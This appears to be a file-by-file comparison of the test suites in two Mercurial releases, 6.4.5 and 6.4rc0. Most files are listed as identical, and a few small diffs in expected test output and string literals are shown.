### Comparing `mercurial-6.4.5/tests/test-hybridencode.py` & `mercurial-6.4rc0/tests/test-hybridencode.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-i18n.t` & `mercurial-6.4rc0/tests/test-i18n.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-identify.t` & `mercurial-6.4rc0/tests/test-identify.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-impexp-branch.t` & `mercurial-6.4rc0/tests/test-impexp-branch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-import-bypass.t` & `mercurial-6.4rc0/tests/test-import-bypass.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-import-context.t` & `mercurial-6.4rc0/tests/test-import-context.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-import-eol.t` & `mercurial-6.4rc0/tests/test-import-eol.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-import-git.t` & `mercurial-6.4rc0/tests/test-import-git.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-import-merge.t` & `mercurial-6.4rc0/tests/test-import-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-import-unknown.t` & `mercurial-6.4rc0/tests/test-import-unknown.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-import.t` & `mercurial-6.4rc0/tests/test-import.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-imports-checker.t` & `mercurial-6.4rc0/tests/test-imports-checker.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-incoming-outgoing.t` & `mercurial-6.4rc0/tests/test-incoming-outgoing.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-infinitepush-bundlestore.t` & `mercurial-6.4rc0/tests/test-infinitepush-bundlestore.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-infinitepush-ci.t` & `mercurial-6.4rc0/tests/test-infinitepush-ci.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-infinitepush.t` & `mercurial-6.4rc0/tests/test-infinitepush.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-inherit-mode.t` & `mercurial-6.4rc0/tests/test-inherit-mode.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-init.t` & `mercurial-6.4rc0/tests/test-init.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-install.t` & `mercurial-6.4rc0/tests/test-install.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue1102.t` & `mercurial-6.4rc0/tests/test-issue1102.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue1175.t` & `mercurial-6.4rc0/tests/test-issue1175.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue1306.t` & `mercurial-6.4rc0/tests/test-issue1306.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue1502.t` & `mercurial-6.4rc0/tests/test-issue1502.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue1802.t` & `mercurial-6.4rc0/tests/test-issue1802.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue1877.t` & `mercurial-6.4rc0/tests/test-issue1877.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue1993.t` & `mercurial-6.4rc0/tests/test-issue1993.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue2137.t` & `mercurial-6.4rc0/tests/test-issue2137.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue3084.t` & `mercurial-6.4rc0/tests/test-issue3084.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue4074.t` & `mercurial-6.4rc0/tests/test-issue4074.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue522.t` & `mercurial-6.4rc0/tests/test-issue522.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue586.t` & `mercurial-6.4rc0/tests/test-issue586.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue5979.t` & `mercurial-6.4rc0/tests/test-issue5979.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue612.t` & `mercurial-6.4rc0/tests/test-issue612.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue619.t` & `mercurial-6.4rc0/tests/test-issue619.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue6528.t` & `mercurial-6.4rc0/tests/test-issue6528.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue660.t` & `mercurial-6.4rc0/tests/test-issue660.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue6642.t` & `mercurial-6.4rc0/tests/test-issue6642.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue672.t` & `mercurial-6.4rc0/tests/test-issue672.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-issue842.t` & `mercurial-6.4rc0/tests/test-issue842.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-journal-exists.t` & `mercurial-6.4rc0/tests/test-journal-exists.t`

 * *Files 6% similar despite different names*

```diff
@@ -43,13 +43,13 @@
 
 #if unix-permissions no-root
   $ hg bundle -qa repo.hg
   $ chmod -w foo/.hg/store/00changelog.i
 
   $ hg -R foo unbundle repo.hg
   adding changesets
-  abort: $EACCES$: '$TESTTMP/repo/foo/.hg/store/.00changelog.i-*' (glob)
+  abort: Permission denied: '$TESTTMP/repo/foo/.hg/store/.00changelog.i-*' (glob)
   [255]
 
   $ if test -f foo/.hg/store/journal; then echo 'journal exists :-('; fi
 #endif
```

### Comparing `mercurial-6.4.5/tests/test-journal-share.t` & `mercurial-6.4rc0/tests/test-journal-share.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-journal.t` & `mercurial-6.4rc0/tests/test-journal.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-keyword.t` & `mercurial-6.4rc0/tests/test-keyword.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-known.t` & `mercurial-6.4rc0/tests/test-known.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-largefiles-cache.t` & `mercurial-6.4rc0/tests/test-largefiles-cache.t`

 * *Files 2% similar despite different names*

```diff
@@ -185,14 +185,15 @@
   $ find share_dst/.hg/largefiles/* | sort
   share_dst/.hg/largefiles/dirstate
   share_dst/.hg/largefiles/undo.backup.dirstate
 
   $ find src/.hg/largefiles/* | egrep "(dirstate|$hash)" | sort
   src/.hg/largefiles/dirstate
   src/.hg/largefiles/e2fb5f2139d086ded2cb600d5a91a196e76bf020
+  src/.hg/largefiles/undo.backup.dirstate
 
 Verify that backwards compatibility is maintained for old storage layout
   $ mv src/.hg/largefiles/$hash share_dst/.hg/largefiles
   $ hg verify --quiet --lfa -R share_dst --config largefiles.usercache=
 
 Inject corruption into the largefiles store and see how update handles that:
```

### Comparing `mercurial-6.4.5/tests/test-largefiles-misc.t` & `mercurial-6.4rc0/tests/test-largefiles-misc.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-largefiles-small-disk.t` & `mercurial-6.4rc0/tests/test-largefiles-small-disk.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-largefiles-update.t` & `mercurial-6.4rc0/tests/test-largefiles-update.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-largefiles-wireproto.t` & `mercurial-6.4rc0/tests/test-largefiles-wireproto.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-largefiles.t` & `mercurial-6.4rc0/tests/test-largefiles.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-legacy-exit-code.t` & `mercurial-6.4rc0/tests/test-legacy-exit-code.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lfconvert.t` & `mercurial-6.4rc0/tests/test-lfconvert.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lfs-bundle.t` & `mercurial-6.4rc0/tests/test-lfs-bundle.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lfs-largefiles.t` & `mercurial-6.4rc0/tests/test-lfs-largefiles.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lfs-pointer.py` & `mercurial-6.4rc0/tests/test-lfs-pointer.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lfs-pointer.py.out` & `mercurial-6.4rc0/tests/test-lfs-pointer.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lfs-serve-access.t` & `mercurial-6.4rc0/tests/test-lfs-serve-access.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lfs-serve.t` & `mercurial-6.4rc0/tests/test-lfs-serve.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lfs-test-server.t` & `mercurial-6.4rc0/tests/test-lfs-test-server.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lfs.t` & `mercurial-6.4rc0/tests/test-lfs.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-linelog.py` & `mercurial-6.4rc0/tests/test-linelog.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-linerange.py` & `mercurial-6.4rc0/tests/test-linerange.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-locate.t` & `mercurial-6.4rc0/tests/test-locate.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lock-badness.t` & `mercurial-6.4rc0/tests/test-lock-badness.t`

 * *Files 1% similar despite different names*

```diff
@@ -131,11 +131,11 @@
 Pushing to a local read-only repo that can't be locked
 
   $ chmod 100 a/.hg/store
 
   $ hg -R b push a
   pushing to a
   searching for changes
-  abort: could not lock repository a: $EACCES$
+  abort: could not lock repository a: Permission denied
   [20]
 
   $ chmod 700 a/.hg/store
```

### Comparing `mercurial-6.4.5/tests/test-lock.py` & `mercurial-6.4rc0/tests/test-lock.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-log-bookmark.t` & `mercurial-6.4rc0/tests/test-log-bookmark.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-log-exthook.t` & `mercurial-6.4rc0/tests/test-log-exthook.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-log-linerange.t` & `mercurial-6.4rc0/tests/test-log-linerange.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-log.t` & `mercurial-6.4rc0/tests/test-log.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-logexchange.t` & `mercurial-6.4rc0/tests/test-logexchange.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-logtoprocess.t` & `mercurial-6.4rc0/tests/test-logtoprocess.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-lrucachedict.py` & `mercurial-6.4rc0/tests/test-lrucachedict.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mac-packages.t` & `mercurial-6.4rc0/tests/test-mac-packages.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mactext.t` & `mercurial-6.4rc0/tests/test-mactext.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mailmap.t` & `mercurial-6.4rc0/tests/test-mailmap.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-manifest-merging.t` & `mercurial-6.4rc0/tests/test-manifest-merging.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-manifest.py` & `mercurial-6.4rc0/tests/test-manifest.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-manifest.t` & `mercurial-6.4rc0/tests/test-manifest.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-match.py` & `mercurial-6.4rc0/tests/test-match.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mdiff.py` & `mercurial-6.4rc0/tests/test-mdiff.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-changedelete.t` & `mercurial-6.4rc0/tests/test-merge-changedelete.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-closedheads.t` & `mercurial-6.4rc0/tests/test-merge-closedheads.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-combination-exec-bytes.t` & `mercurial-6.4rc0/tests/test-merge-combination-exec-bytes.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-combination-file-content.t` & `mercurial-6.4rc0/tests/test-merge-combination-file-content.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-combination-misc.t` & `mercurial-6.4rc0/tests/test-merge-combination-misc.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-commit.t` & `mercurial-6.4rc0/tests/test-merge-commit.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-criss-cross.t` & `mercurial-6.4rc0/tests/test-merge-criss-cross.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-default.t` & `mercurial-6.4rc0/tests/test-merge-default.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-exec.t` & `mercurial-6.4rc0/tests/test-merge-exec.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-force.t` & `mercurial-6.4rc0/tests/test-merge-force.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-halt.t` & `mercurial-6.4rc0/tests/test-merge-halt.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-internal-tools-pattern.t` & `mercurial-6.4rc0/tests/test-merge-internal-tools-pattern.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-local.t` & `mercurial-6.4rc0/tests/test-merge-local.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-no-file-change.t` & `mercurial-6.4rc0/tests/test-merge-no-file-change.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-partial-tool.t` & `mercurial-6.4rc0/tests/test-merge-partial-tool.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-remove.t` & `mercurial-6.4rc0/tests/test-merge-remove.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-revert.t` & `mercurial-6.4rc0/tests/test-merge-revert.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-revert2.t` & `mercurial-6.4rc0/tests/test-merge-revert2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-subrepos.t` & `mercurial-6.4rc0/tests/test-merge-subrepos.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-symlinks.t` & `mercurial-6.4rc0/tests/test-merge-symlinks.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-tools.t` & `mercurial-6.4rc0/tests/test-merge-tools.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge-types.t` & `mercurial-6.4rc0/tests/test-merge-types.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge1.t` & `mercurial-6.4rc0/tests/test-merge1.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge10.t` & `mercurial-6.4rc0/tests/test-merge10.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge2.t` & `mercurial-6.4rc0/tests/test-merge2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge4.t` & `mercurial-6.4rc0/tests/test-merge4.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge5.t` & `mercurial-6.4rc0/tests/test-merge5.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge6.t` & `mercurial-6.4rc0/tests/test-merge6.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge7.t` & `mercurial-6.4rc0/tests/test-merge7.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge8.t` & `mercurial-6.4rc0/tests/test-merge8.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-merge9.t` & `mercurial-6.4rc0/tests/test-merge9.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-minifileset.py` & `mercurial-6.4rc0/tests/test-minifileset.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-minirst.py` & `mercurial-6.4rc0/tests/test-minirst.py`

 * *Files 0% similar despite different names*

```diff
@@ -150,15 +150,15 @@
 marker after the option. It is treated as a normal paragraph:
 
 --foo bar baz
 """
 
 debugformats('options', options)
 
-fields = br"""
+fields = b"""
 :a: First item.
 :ab: Second item. Indentation and wrapping
      is handled automatically.
 :c\:d: a key with colon
 :efg\:\:hh: a key with many colon
 
 Next list:
```

### Comparing `mercurial-6.4.5/tests/test-minirst.py.out` & `mercurial-6.4rc0/tests/test-minirst.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-missing-capability.t` & `mercurial-6.4rc0/tests/test-missing-capability.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-eol.t` & `mercurial-6.4rc0/tests/test-mq-eol.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-git.t` & `mercurial-6.4rc0/tests/test-mq-git.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-guards.t` & `mercurial-6.4rc0/tests/test-mq-guards.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-header-date.t` & `mercurial-6.4rc0/tests/test-mq-header-date.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-header-from.t` & `mercurial-6.4rc0/tests/test-mq-header-from.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-merge.t` & `mercurial-6.4rc0/tests/test-mq-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-missingfiles.t` & `mercurial-6.4rc0/tests/test-mq-missingfiles.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-pull-from-bundle.t` & `mercurial-6.4rc0/tests/test-mq-pull-from-bundle.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qclone-http.t` & `mercurial-6.4rc0/tests/test-mq-qclone-http.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qdelete.t` & `mercurial-6.4rc0/tests/test-mq-qdelete.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qdiff.t` & `mercurial-6.4rc0/tests/test-mq-qdiff.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qfold.t` & `mercurial-6.4rc0/tests/test-mq-qfold.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qgoto.t` & `mercurial-6.4rc0/tests/test-mq-qgoto.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qimport-fail-cleanup.t` & `mercurial-6.4rc0/tests/test-mq-qimport-fail-cleanup.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qimport.t` & `mercurial-6.4rc0/tests/test-mq-qimport.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qnew.t` & `mercurial-6.4rc0/tests/test-mq-qnew.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qpush-exact.t` & `mercurial-6.4rc0/tests/test-mq-qpush-exact.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qpush-fail.t` & `mercurial-6.4rc0/tests/test-mq-qpush-fail.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qqueue.t` & `mercurial-6.4rc0/tests/test-mq-qqueue.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qrefresh-interactive.t` & `mercurial-6.4rc0/tests/test-mq-qrefresh-interactive.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qrefresh-replace-log-message.t` & `mercurial-6.4rc0/tests/test-mq-qrefresh-replace-log-message.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qrefresh.t` & `mercurial-6.4rc0/tests/test-mq-qrefresh.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-qrename.t` & `mercurial-6.4rc0/tests/test-mq-qrename.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-safety.t` & `mercurial-6.4rc0/tests/test-mq-safety.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-subrepo-svn.t` & `mercurial-6.4rc0/tests/test-mq-subrepo-svn.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-subrepo.t` & `mercurial-6.4rc0/tests/test-mq-subrepo.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq-symlinks.t` & `mercurial-6.4rc0/tests/test-mq-symlinks.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mq.t` & `mercurial-6.4rc0/tests/test-mq.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-mv-cp-st-diff.t` & `mercurial-6.4rc0/tests/test-mv-cp-st-diff.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-acl.t` & `mercurial-6.4rc0/tests/test-narrow-acl.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-archive.t` & `mercurial-6.4rc0/tests/test-narrow-archive.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-clone-no-ellipsis.t` & `mercurial-6.4rc0/tests/test-narrow-clone-no-ellipsis.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-clone-non-narrow-server.t` & `mercurial-6.4rc0/tests/test-narrow-clone-non-narrow-server.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-clone-nonlinear.t` & `mercurial-6.4rc0/tests/test-narrow-clone-nonlinear.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-clone-stream.t` & `mercurial-6.4rc0/tests/test-narrow-clone-stream.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-clone.t` & `mercurial-6.4rc0/tests/test-narrow-clone.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-commit.t` & `mercurial-6.4rc0/tests/test-narrow-commit.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-copies.t` & `mercurial-6.4rc0/tests/test-narrow-copies.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-debugcommands.t` & `mercurial-6.4rc0/tests/test-narrow-debugcommands.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-debugrebuilddirstate.t` & `mercurial-6.4rc0/tests/test-narrow-debugrebuilddirstate.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-exchange-merges.t` & `mercurial-6.4rc0/tests/test-narrow-exchange-merges.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-exchange.t` & `mercurial-6.4rc0/tests/test-narrow-exchange.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-expanddirstate.t` & `mercurial-6.4rc0/tests/test-narrow-expanddirstate.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-merge-outside.t` & `mercurial-6.4rc0/tests/test-narrow-merge-outside.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-merge.t` & `mercurial-6.4rc0/tests/test-narrow-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-patch.t` & `mercurial-6.4rc0/tests/test-narrow-patch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-patterns.t` & `mercurial-6.4rc0/tests/test-narrow-patterns.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-pull.t` & `mercurial-6.4rc0/tests/test-narrow-pull.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-rebase.t` & `mercurial-6.4rc0/tests/test-narrow-rebase.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-shallow-merges.t` & `mercurial-6.4rc0/tests/test-narrow-shallow-merges.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-shallow.t` & `mercurial-6.4rc0/tests/test-narrow-shallow.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-share.t` & `mercurial-6.4rc0/tests/test-narrow-share.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-sparse.t` & `mercurial-6.4rc0/tests/test-narrow-sparse.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-strip.t` & `mercurial-6.4rc0/tests/test-narrow-strip.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-trackedcmd.t` & `mercurial-6.4rc0/tests/test-narrow-trackedcmd.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-update.t` & `mercurial-6.4rc0/tests/test-narrow-update.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-widen-no-ellipsis.t` & `mercurial-6.4rc0/tests/test-narrow-widen-no-ellipsis.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow-widen.t` & `mercurial-6.4rc0/tests/test-narrow-widen.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-narrow.t` & `mercurial-6.4rc0/tests/test-narrow.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-nested-repo.t` & `mercurial-6.4rc0/tests/test-nested-repo.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-newbranch.t` & `mercurial-6.4rc0/tests/test-newbranch.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-newcgi.t` & `mercurial-6.4rc0/tests/test-newcgi.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-newercgi.t` & `mercurial-6.4rc0/tests/test-newercgi.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-no-symlinks.t` & `mercurial-6.4rc0/tests/test-no-symlinks.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-nointerrupt.t` & `mercurial-6.4rc0/tests/test-nointerrupt.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-notify-changegroup.t` & `mercurial-6.4rc0/tests/test-notify-changegroup.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-notify.t` & `mercurial-6.4rc0/tests/test-notify.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obshistory.t` & `mercurial-6.4rc0/tests/test-obshistory.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obsmarker-template.t` & `mercurial-6.4rc0/tests/test-obsmarker-template.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obsmarkers-effectflag.t` & `mercurial-6.4rc0/tests/test-obsmarkers-effectflag.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obsolete-bounds-checking.t` & `mercurial-6.4rc0/tests/test-obsolete-bounds-checking.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obsolete-bundle-strip.t` & `mercurial-6.4rc0/tests/test-obsolete-bundle-strip.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obsolete-changeset-exchange.t` & `mercurial-6.4rc0/tests/test-obsolete-changeset-exchange.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obsolete-check-push.t` & `mercurial-6.4rc0/tests/test-obsolete-check-push.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obsolete-checkheads.t` & `mercurial-6.4rc0/tests/test-obsolete-checkheads.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obsolete-distributed.t` & `mercurial-6.4rc0/tests/test-obsolete-distributed.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obsolete-divergent.t` & `mercurial-6.4rc0/tests/test-obsolete-divergent.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-obsolete-tag-cache.t` & `mercurial-6.4rc0/tests/test-obsolete-tag-cache.t`

 * *Files identical despite different names*

